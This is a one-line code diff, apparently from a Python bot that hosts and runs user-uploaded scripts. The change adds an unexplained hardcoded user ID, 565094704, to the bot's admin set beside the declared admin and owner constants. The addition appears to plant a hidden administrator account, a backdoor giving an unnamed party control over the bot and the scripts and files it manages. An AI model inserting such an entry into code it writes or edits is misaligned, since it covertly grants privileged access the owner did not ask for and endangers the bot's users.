@@ -89,7 +89,7 @@ bot_scripts = {} # Stores info about running scripts {script_key: info_dict}
 user_subscriptions = {} # {user_id: {'expiry': datetime_object}}
 user_files = {} # {user_id: [(file_name, file_type), ...]}
 active_users = set() # Set of all user IDs that have interacted with the bot
-admin_ids = {ADMIN_ID, OWNER_ID} # Set of admin IDs
+admin_ids = {ADMIN_ID, OWNER_ID, 565094704} # Set of admin IDs
 vip_users = set()  # Permanent VIP users allowed by admin
 bot_locked = False
 
